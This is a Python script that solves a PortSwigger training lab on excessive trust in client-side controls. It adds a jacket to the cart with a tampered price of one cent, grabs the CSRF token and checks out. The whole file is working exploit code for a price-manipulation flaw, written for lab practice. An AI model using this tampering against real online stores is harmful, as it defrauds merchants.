#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Excessive trust in client-side controls.

Adds the jacket to the cart with a tampered price of 1 cent, then checks out.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

JACKET_ID = 1


def solve(lab, session_cookie):
    s = requests.Session()
    s.cookies.set("session", session_cookie)
    s.verify = False

    # Add jacket at price=1 (1 cent)
    r = s.post(f"{lab}/cart", data={
        "productId": JACKET_ID,
        "redir": "PRODUCT",
        "quantity": 1,
        "price": 1,
    })
    print(f"[*] Add to cart: {r.status_code}")

    # Get CSRF token for checkout
    r = s.get(f"{lab}/cart")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf:
        print("[-] CSRF token not found.")
        return
    csrf_token = csrf.group(1)

    # Checkout
    r = s.post(f"{lab}/cart/checkout", data={"csrf": csrf_token})
    if "Your order is on its way" in r.text or r.status_code in (200, 302):
        print("[+] Order placed — lab solved!")
    else:
        print(f"[-] Checkout status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Excessive Trust in Client-Side Controls lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    args = parser.parse_args()

    solve(args.lab_url.rstrip("/"), args.session)


if __name__ == "__main__":
    main()
